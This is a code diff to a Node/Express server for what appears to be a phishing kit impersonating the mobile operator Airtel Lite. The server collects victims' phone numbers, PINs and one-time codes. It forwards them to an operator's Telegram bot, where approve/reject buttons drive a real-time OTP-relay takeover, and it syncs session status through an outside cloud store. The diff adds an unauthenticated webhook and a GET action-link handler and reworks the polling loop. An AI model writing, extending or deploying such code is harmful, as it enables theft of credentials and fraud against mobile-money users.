@@ -176,23 +176,33 @@ async function pollTelegramUpdates() {
   if (isPolling) return;
   isPolling = true;
 
-  console.log('[Telegram Worker] Starting central polling loop with allowed_updates=[message, callback_query]...');
-
-  // Reset any stale webhook so getUpdates receives all callback queries
   try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook?drop_pending_updates=false`);
-  } catch (e) {
-    console.warn('[Telegram Worker] Webhook reset error:', e);
+    const hookInfoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getWebhookInfo`);
+    const hookData = await hookInfoRes.json();
+    if (hookData && hookData.ok && hookData.result && hookData.result.url) {
+      console.log(`[Telegram Worker] Active Webhook detected: ${hookData.result.url}. Webhook handles updates; getUpdates polling suspended to avoid 409 conflict.`);
+      isPolling = false;
+      return;
+    }
+  } catch (err) {
+    console.warn('[Telegram Worker] Webhook check failed:', err);
   }
+
+  console.log('[Telegram Worker] No active webhook, starting polling loop with allowed_updates=[message, callback_query]...');
 
   while (true) {
     try {
-      // Explicitly request callback_query and message updates to prevent Telegram filtering out button events
       const allowedUpdatesParam = encodeURIComponent(JSON.stringify(['message', 'callback_query']));
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${telegramOffset}&timeout=20&limit=50&allowed_updates=${allowedUpdatesParam}`;
       
       const res = await fetch(url);
       if (!res.ok) {
+        if (res.status === 409) {
+          console.warn('[Telegram Worker] 409 Conflict received, waiting 15s before rechecking webhook status...');
+          await new Promise((r) => setTimeout(r, 15000));
+          isPolling = false;
+          return pollTelegramUpdates();
+        }
         await new Promise((r) => setTimeout(r, 2000));
         continue;
       }
@@ -332,56 +342,18 @@ async function pollTelegramUpdates() {
               }
             }
           }
-
-          // 2. TEXT REPLIES OR COMMANDS FROM ADMIN
-          if (update.message && update.message.text) {
-            const text = update.message.text.trim().toLowerCase();
-            const replyMsgId = update.message.reply_to_message?.message_id;
-
-            // Find session by reply to message ID
-            let targetSession: SessionRecord | undefined;
-            if (replyMsgId) {
-              for (const s of sessions.values()) {
-                if (s.loginMessageId === replyMsgId || s.otpMessageId === replyMsgId) {
-                  targetSession = s;
-                  break;
-                }
-              }
-            }
-
-            if (targetSession) {
-              const isLoginMsg = targetSession.loginMessageId === replyMsgId;
-              if (['ok', 'oui', 'valider', 'yes', '1', 'v'].includes(text)) {
-                if (isLoginMsg) targetSession.loginStatus = 'approved';
-                else targetSession.otpStatus = 'approved';
-                targetSession.lastUpdated = Date.now();
-                saveSessionsToDisk();
-                notifySessionUpdated(targetSession);
-                sendTelegramMessage(`✅ Action enregistrée: Session <code>${targetSession.sessionId}</code> validée !`);
-              } else if (['non', 'refuser', 'rejeter', 'no', '0', 'r'].includes(text)) {
-                if (isLoginMsg) targetSession.loginStatus = 'rejected';
-                else targetSession.otpStatus = 'rejected';
-                targetSession.lastUpdated = Date.now();
-                saveSessionsToDisk();
-                notifySessionUpdated(targetSession);
-                sendTelegramMessage(`❌ Action enregistrée: Session <code>${targetSession.sessionId}</code> rejetée !`);
-              }
-            }
-          }
         }
       }
     } catch (err) {
       console.warn('[Telegram Worker] Polling cycle error:', err);
-      await new Promise((r) => setTimeout(r, 1500));
+      await new Promise((r) => setTimeout(r, 2000));
     }
   }
 }
 
-// Start central telegram polling worker
+// Start central telegram worker
 pollTelegramUpdates().catch((e) => {
-  console.error('[Telegram Worker] Fatal crash, restarting in 3s...', e);
-  isPolling = false;
-  setTimeout(pollTelegramUpdates, 3000);
+  console.error('[Telegram Worker] Error:', e);
 });
 
 // Periodic Session Cleanup:
@@ -706,7 +678,195 @@ app.get('/api/telegram/wait-status', (req, res) => {
   });
 });
 
-// 5. Manual action simulator endpoint
+// 5. Telegram Webhook Handler
+app.post('/api/telegram/webhook', async (req, res) => {
+  try {
+    const update = req.body || {};
+    if (update.callback_query) {
+      const cq = update.callback_query;
+      const callbackData = cq.data || '';
+      const callbackId = cq.id;
+      const msgId = cq.message?.message_id;
+      const chatId = cq.message?.chat?.id;
+
+      let recordId = '';
+      let actionType = '';
+
+      if (callbackData.startsWith('approve_login_')) {
+        recordId = callbackData.replace('approve_login_', '');
+        actionType = 'approve_login';
+      } else if (callbackData.startsWith('reject_login_')) {
+        recordId = callbackData.replace('reject_login_', '');
+        actionType = 'reject_login';
+      } else if (callbackData.startsWith('approve_otp_')) {
+        recordId = callbackData.replace('approve_otp_', '');
+        actionType = 'approve_otp';
+      } else if (callbackData.startsWith('reject_otp_')) {
+        recordId = callbackData.replace('reject_otp_', '');
+        actionType = 'reject_otp';
+      }
+
+      if (recordId) {
+        // 1. Update in-memory session
+        const session = sessions.get(recordId);
+        if (session) {
+          if (actionType === 'approve_login') session.loginStatus = 'approved';
+          else if (actionType === 'reject_login') session.loginStatus = 'rejected';
+          else if (actionType === 'approve_otp') session.otpStatus = 'approved';
+          else if (actionType === 'reject_otp') session.otpStatus = 'rejected';
+          session.lastUpdated = Date.now();
+          saveSessionsToDisk();
+          notifySessionUpdated(session);
+        }
+
+        // 2. Update cloud store
+        try {
+          const fetchRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`);
+          if (fetchRes.ok) {
+            const record = await fetchRes.json();
+            const data = record.data || {};
+            if (actionType === 'approve_login') data.loginStatus = 'approved';
+            else if (actionType === 'reject_login') data.loginStatus = 'rejected';
+            else if (actionType === 'approve_otp') data.otpStatus = 'approved';
+            else if (actionType === 'reject_otp') data.otpStatus = 'rejected';
+            data.lastUpdated = Date.now();
+
+            await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
+              method: 'PUT',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ name: record.name || recordId, data }),
+            });
+          }
+        } catch (e) {
+          console.warn('Cloud sync error in server webhook:', e);
+        }
+
+        // 3. Answer Telegram callback
+        let alertMsg = 'Action enregistrée';
+        if (actionType === 'approve_login') alertMsg = '✅ Connexion validée ! Passage au code OTP.';
+        if (actionType === 'reject_login') alertMsg = '❌ Connexion refusée.';
+        if (actionType === 'approve_otp') alertMsg = '✅ Code OTP validé avec succès !';
+        if (actionType === 'reject_otp') alertMsg = '❌ Code OTP rejeté ou invalide.';
+
+        answerCallbackQuery(callbackId, alertMsg, true);
+
+        // 4. Update message in Telegram
+        if (msgId && chatId) {
+          const phone = session?.phone || 'Inconnu';
+          const plan = session?.planName || 'Forfait Airtel Starlink';
+          let updatedText = '';
+
+          if (actionType === 'approve_login') {
+            updatedText =
+              `🔴 <b>AIRTEL LITE - CONNEXION CLIENT VALIDÉE</b>\n\n` +
+              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
+              `🔑 <b>Code PIN:</b> <code>${session?.pin || '****'}</code>\n` +
+              `📦 <b>Forfait:</b> ${plan}\n` +
+              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
+              `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
+              `🟢 <b>STATUT: ✅ APPROUVÉ PAR L'ADMINISTRATEUR</b>`;
+          } else if (actionType === 'reject_login') {
+            updatedText =
+              `🔴 <b>AIRTEL LITE - CONNEXION CLIENT REFUSÉE</b>\n\n` +
+              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
+              `🔑 <b>Code PIN:</b> <code>${session?.pin || '****'}</code>\n` +
+              `📦 <b>Forfait:</b> ${plan}\n` +
+              `🆔 <b>Session:</b> <code>${recordId}</code>\n\n` +
+              `🔴 <b>STATUT: ❌ REJETÉ (CODE PIN OU NUMÉRO INCORRECT)</b>`;
+          } else if (actionType === 'approve_otp') {
+            updatedText =
+              `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP VALIDÉ</b>\n\n` +
+              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
+              `🔢 <b>Code OTP:</b> <code>${session?.otp || '****'}</code>\n` +
+              `📦 <b>Forfait:</b> ${plan}\n` +
+              `🆔 <b>Session:</b> <code>${recordId}</code>\n\n` +
+              `🟢 <b>STATUT: ✅ OTP CONFIRMÉ ET VALIDÉ</b>`;
+          } else if (actionType === 'reject_otp') {
+            updatedText =
+              `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP REFUSÉ</b>\n\n` +
+              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
+              `🔢 <b>Code OTP:</b> <code>${session?.otp || '****'}</code>\n` +
+              `📦 <b>Forfait:</b> ${plan}\n` +
+              `🆔 <b>Session:</b> <code>${recordId}</code>\n\n` +
+              `🔴 <b>STATUT: ❌ OTP REJETÉ / INVALIDE</b>`;
+          }
+
+          if (updatedText) {
+            editMessageText(chatId, msgId, updatedText);
+          }
+        }
+      }
+    }
+    return res.status(200).json({ ok: true });
+  } catch (err: any) {
+    return res.status(200).json({ ok: true, error: err?.message });
+  }
+});
+
+// 6. Direct Web Action Link Handler
+app.get('/api/telegram/action', async (req, res) => {
+  const { id, action } = req.query as { id: string; action: string };
+  if (!id || !action) {
+    return res.status(400).send('<h3>id et action requis.</h3>');
+  }
+
+  const session = sessions.get(id);
+  if (session) {
+    if (action === 'approve_login') session.loginStatus = 'approved';
+    else if (action === 'reject_login') session.loginStatus = 'rejected';
+    else if (action === 'approve_otp') session.otpStatus = 'approved';
+    else if (action === 'reject_otp') session.otpStatus = 'rejected';
+    session.lastUpdated = Date.now();
+    saveSessionsToDisk();
+    notifySessionUpdated(session);
+  }
+
+  try {
+    const fetchRes = await fetch(`https://api.restful-api.dev/objects/${id}`);
+    if (fetchRes.ok) {
+      const record = await fetchRes.json();
+      const data = record.data || {};
+      if (action === 'approve_login') data.loginStatus = 'approved';
+      else if (action === 'reject_login') data.loginStatus = 'rejected';
+      else if (action === 'approve_otp') data.otpStatus = 'approved';
+      else if (action === 'reject_otp') data.otpStatus = 'rejected';
+      data.lastUpdated = Date.now();
+
+      await fetch(`https://api.restful-api.dev/objects/${id}`, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name: record.name || id, data }),
+      });
+    }
+  } catch (e) {
+    console.warn('Action cloud sync error:', e);
+  }
+
+  return res.status(200).send(`
+    <!DOCTYPE html>
+    <html>
+      <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Validation Airtel Lite</title>
+        <style>
+          body { font-family: sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
+          .card { background: #1e293b; border-radius: 20px; padding: 30px; max-width: 380px; width: 100%; border: 1px solid rgba(255,255,255,0.1); }
+          h2 { color: #10b981; margin: 0 0 10px; }
+          p { color: #94a3b8; font-size: 14px; }
+        </style>
+      </head>
+      <body>
+        <div class="card">
+          <h2>✅ Action validée avec succès !</h2>
+          <p>Le statut a été mis à jour en direct pour l'utilisateur.<br>Vous pouvez fermer cette page.</p>
+        </div>
+      </body>
+    </html>
+  `);
+});
+
+// 7. Manual action simulator endpoint
 app.post('/api/telegram/manual-action', (req, res) => {
   const { sessionId, type, action } = req.body;
   const session = sessions.get(sessionId);
